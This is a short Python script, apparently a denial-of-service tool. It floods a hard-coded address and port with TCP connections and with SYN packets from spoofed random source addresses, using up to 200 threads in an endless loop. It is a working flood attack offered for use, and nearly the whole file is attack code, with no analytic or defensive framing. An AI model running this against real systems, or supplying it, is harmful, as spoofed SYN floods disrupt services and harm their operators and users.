import socket
import random
import sys
import threading
from scapy.all import *
from scapy.layers.inet import IP, TCP

target       = "192.168.32.130"
port         = 8081
thread_limit = 200
total        = 0

#!# End Global Config #!#
class sendSYN(threading.Thread):
        global target, port
        def __init__(self):
                threading.Thread.__init__(self)

        def run(self):
                # There are two different ways you can go about pulling this off.
                # You can either:
                #   - 1. Just open a socket to your target on any old port
                #   - 2. Or you can be a cool kid and use scapy to make it look cool, and overcomplicated!
                #
                # (Uncomment whichever method you'd like to use)

                # Method 1 -
                s = socket.socket()
                s.connect((target,port))

                # Methods 2 -
                i = IP()
                i.src = "%i.%i.%i.%i" % (random.randint(1,254),random.randint(1,254),random.randint(1,254),random.randint(1,254))
                i.dst = target

                t = TCP()
                t.sport = random.randint(1,65535)
                t.dport = port
                t.flags = 'S'
                send(i/t, verbose=0)

if __name__ == "__main__":
        # Make sure we have all the arguments we need
        # Prepare our variables
        #scapy.conf.iface = interface # Uncomment this if you're going to use Scapy

        # Hop to it!
        print( "Flooding %s:%i with SYN packets." % (target, port))
        while True:
                if threading.activeCount() < thread_limit:
                        sendSYN().start()
                        total += 1
                        sys.stdout.write("\rTotal packets sent:\t\t\t%i" % total)